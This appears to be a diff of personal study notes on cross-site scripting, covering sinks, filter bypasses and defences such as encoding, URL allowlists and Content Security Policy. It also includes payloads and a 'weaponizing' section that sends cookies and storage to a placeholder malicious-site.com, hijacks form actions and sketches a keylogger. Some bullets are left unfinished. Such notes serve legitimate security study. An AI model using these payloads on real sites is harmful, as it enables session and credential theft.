@@ -22,12 +22,12 @@
 Cross site scripting(XSS) allows an attacker to get a victim to run malicious code on their browser while looking like it came from a legitimate source.
 
 There are 2 type of XSS attacks.
-- Through URL parameters
+1. Through URL parameters
 	- When a victim is sent a malicious URL, they may click on it because the base domain comes from a legitimate source.
-		- **Reflected XSS**: Server uses the URL parameter to change the DOM.
-		- **DOM-Based XSS**: Client uses the URL parameter to change the DOM.
-- Through the database
-	- **Stored XSS**: When the victim comes across malicious data stored in the database, that malicious data gets ran on their browser.
+		- **Reflected XSS** - Server uses the URL parameter to change the DOM.
+		- **DOM-Based XSS** - Client uses the URL parameter to change the DOM.
+2. Through the database
+	- **Stored XSS** - When the victim comes across malicious data stored in the database, that malicious data gets ran on their browser.
 		- Ex: Posting a comment which other users can see.
 
 ## Todo
@@ -87,11 +87,14 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 		6. Server-Side Validation
 		7. Output Encoding
 
+## Table of Contents
+
 <!-- TOC -->
 
 - [Cross Site ScriptingXSS](#cross-site-scriptingxss)
 	- [Todo](#todo)
 	- [Need to research](#need-to-research)
+	- [Table of Contents](#table-of-contents)
 	- [URL parameter XSS](#url-parameter-xss)
 	- [Common payloads](#common-payloads)
 	- [Different types of Sinks - Where user input is used](#different-types-of-sinks---where-user-input-is-used)
@@ -115,11 +118,11 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 
 <!-- /TOC -->
 
-## URL parameter XSS
-- The URL parameter have to be used somewhere within the DOM.
-	- They may not visually show up, but they may still be used. Ex: Hidden inputs
+## [URL parameter XSS](#table-of-contents)
+- The URL parameter has to be used somewhere within the DOM.
+	- This may not visually show up, but they may still be used. Ex: Hidden inputs
 
-```javascript
+```
 The URL
 	https://insecure-website.com/?parameter=<script>print()</script>
 Possible html output
@@ -129,45 +132,76 @@ Possible html output
 - Forms often use URL parameters to pass information
 - Fragment identifiers(`#`s in the URL) can be used by the client to change the DOM.
 
-## Common payloads
+## [Common payloads](#table-of-contents)
 - `<script>print()</script>`
 - `<img src onerror=print()>`
 - `<a href="javascript:print()">`
 
 [Payload list](https://github.com/payloadbox/xss-payload-list)
 
-- Common payload content
+
+Common payload content
 - `print()`
 - `alert()`
 - `confirm()`
 - `prompt()`
 - `console.log()`
+- You can use ``` print`` ``` instead of `print()`
 
-## Different types of Sinks - Where user input is used
+## [Different types of Sinks - Where user input is used](#table-of-contents)
 
-### Inside html elements
-- Ex: `<p>{userInput}</p>`
+### [Inside html elements](#table-of-contents)
+- Ex: `<p>userInput</p>`
 
-In order to prevent this the server should filter out any `<`s
+In order to perform an attack on this sink you can just include the html attack.
+- Ex: `<p><script>print()</script></p>`
+
+In order to prevent this any `<`s should be filtered out
 - Ex: `userInput = userInput.replaceAll("<", "&lt;")`
-- This works because no html entity can start without a `<`
+- This works because no html entity can start or end without a `<`
 
-### Inside html attributes
-- Ex: `<a src="{user input}">Link</a>`
-- Ex2: `<input value="{user input}">`
+### [Inside html attributes](#table-of-contents)
+- Ex: `<a src="userInput">Link</a>`
+- Ex 2: `<input value="userInput">`
 
-In order to perform an XSS attack you can either use URIs or escape the attribute with `"`, `'`, or `s
+In order to perform an attack on this sink you can either use URIs or escape the attribute and add another attribute or your html attack.
+- Ex URI: `<a src="javascript:print()">Link</a>`
+- Ex escape and add another attribute: `<a src="" onclick=print()>Link</a>`
+- Ex escape and add html: `<a src="" ></a><script>print()</script><a>Link</a>`
 
-In order to prevent this the server should filter out any `<`s and `"`s as well as have a whitelist of URIs
+In order to prevent this any `<`s and `"`s should be filtered out and there should be a whitelist of URIs.
 - Ex: `userInput = userInput.replaceAll("<", "&lt;").replaceAll('"', "&quot;")`
-- This works because no html entity can start without a `<`
+	- How do you prevent URI based XSS attacks?
 
-#### Uniform Resource Identifier(URIs)
+- Change casing
+- Adding in spaces
+- 
+
+- Ex: `
+	- Make sure it doesn't start with javascript:
+
+```
+
+function isSafeUrl(url) {
+    const allowedSchemes = ['http:', 'https:', 'mailto:'];
+    const urlObj = new URL(url);
+    return allowedSchemes.includes(urlObj.protocol);
+}
+
+const userInputUrl = "javascript:alert('xss')";
+if (isSafeUrl(userInputUrl)) {
+    console.log('URL is safe');
+} else {
+    console.log('URL is not safe');
+}
+```
+
+#### [Uniform Resource Identifier(URIs)](#table-of-contents)
 - URIs are often used for attributes which can access the internet
 	- `src`, `href`, `action`, `data`, `formaction`, `poster`, `manifest`, `ping`, `cite`, `usemap`
 - URIs can also be used for many event based attributes
-	- Ex: `<button onclick="javascript:alert()">`
-- URIs cannot be used for `<input value="{user input}">`
+	- Ex: `<button onclick="javascript:print()">`
+- URIs cannot be used for `<input value="userInput">`
 - URIs
 	- `javascript:print()`
 	- Doesn't work on modern browsers
@@ -200,7 +234,9 @@ In order to prevent URI attacks there should be a whitelist of acceptable URIs a
 	}
 ```
 
-### Inside Javascript(Client side javascript inject)
+`<a src="?javascript:print()">Link</a>` does not work
+
+### [Inside Javascript(Client side javascript inject)](#table-of-contents)
 - Ex:
 
 How do you find these?
@@ -228,15 +264,15 @@ const param2 = params.get('param2')
 	Avoid using `element.innerHTML = userInput;` and instead use `element.innerText = userInput;`
 		- This doesn't work if the element is a script?
 
-### Inside CSS
+### [Inside CSS](#table-of-contents)
 	- Not very common
 
-### Inside JSON
+### [Inside JSON](#table-of-contents)
 	- Have to escape the "s
 	- Inject another key and value
 	- Can you also execute javascript of html?
 
-## Easy ways to prevent XSS
+## [Easy ways to prevent XSS](#table-of-contents)
 - Pass information through the body instead of through URL parameters
 - Be very cautious when using react's `dangerouslySetInnerHTML`
 - Follow the common prevention techniques for the different sinks
@@ -244,10 +280,11 @@ const param2 = params.get('param2')
 - Use whitelists and/or blacklists for allowable data
 - Use Content Security Policy
 
-### Content Security Policies (CSPs)
-- Content Security Policies are a browser/client protection which allows the server to specify which sources can be used for 
+### [Content Security Policies (CSPs)](#table-of-contents)
+- Content Security Policies are a browser/client protection which allows the server to specify which sources can be used for
 	- It can be used to mitigate XSS attacks.
 - CSPs are set by the server through a response header called `Content-Security-Policy:`.
+	- That isn't the only header
 
 - Doesn't block HTML injection?
 - Used to create a whitelist on allowed sources for each content?
@@ -316,7 +353,7 @@ Content-Security-Policy: script-src 'self'; report-uri 'capture-data.php';
 	- https://web.dev/articles/csp
 	- Content-Security-Policy-Report-Only:
 
-## Bypassing common XSS filters
+## [Bypassing common XSS filters](#table-of-contents)
 - Trying the same character multiple times(replace vs replaceAll)
 - Avoiding commonly used XSS attacks
 	- Try something other than
@@ -341,15 +378,15 @@ See [XXS Tests](./xss_tests.md)
 - Try to avoid attack vectors where everyone will try XSS
 	- The 1st search box on the home page
 
-## Weaponizing XSS payloads
+## [Weaponizing XSS payloads](#table-of-contents)
 
-### Stealing information
+### [Stealing information](#table-of-contents)
 - Redirect site to malicious site: `window.location='https://malicious-site.com?info=' + info`
 - Send data to malicious site without redirect: `
 - Mouse hover over element: `<a href="https://www.youtube.com/" onmouseover="window.location='https://malicious-site.com?info=' + info">Youtube</a>`
 	- This could be blocked by Content Security Policy
 
-#### Key logger
+#### [Key logger](#table-of-contents)
 - Can't use `fetch` because it's blocked by CORS
 
 ```javascript
@@ -360,29 +397,29 @@ document.addEventListener('keydown', (event) => {
 });
 ```
 
-### What information to steal
+### [What information to steal](#table-of-contents)
 - Cookies: `escape(document.cookie)`
 	- `escape` URL encodes the cookie so it can be sent through the URL
 - Storage: `escape(JSON.stringify(localStorage))` or `escape(JSON.stringify(sessionStorage))`
 
-### Manipulating actions
+### [Manipulating actions](#table-of-contents)
 - Wait for elements to load: `<script>window.onload=function(){`
 	- Making a comment: `document.getElementByName('comment')[0].innerHTML='Comment';document.getElementById('theform').submit();`
 	- Changing action(where info is sent) of a form: `document.getElementById('theform').action='https://malicious-site.com'`
 - `}</script>`
 
 
-## HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)
+## [HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)](#table-of-contents)
 - **HTML encoding** - Search and replace key characters to prevent XSS
 - **HTML Sanitization** - Some user input need to allow certain HTML elements.
 	- It can be very difficult to prevent XSS attacks. Often whitelists are used to prevent malicious HTML elements, but this may not be set up correctly.
 	- Ex: Stylized emails with HTML and CSS
 
-## File upload vulnerabilities
+## [File upload vulnerabilities](#table-of-contents)
 - SVGs
 - PDFs
 
-## Reference table
+## [Reference table](#table-of-contents)
 
 - Same number as URL(Hex)
 	- HTML hex
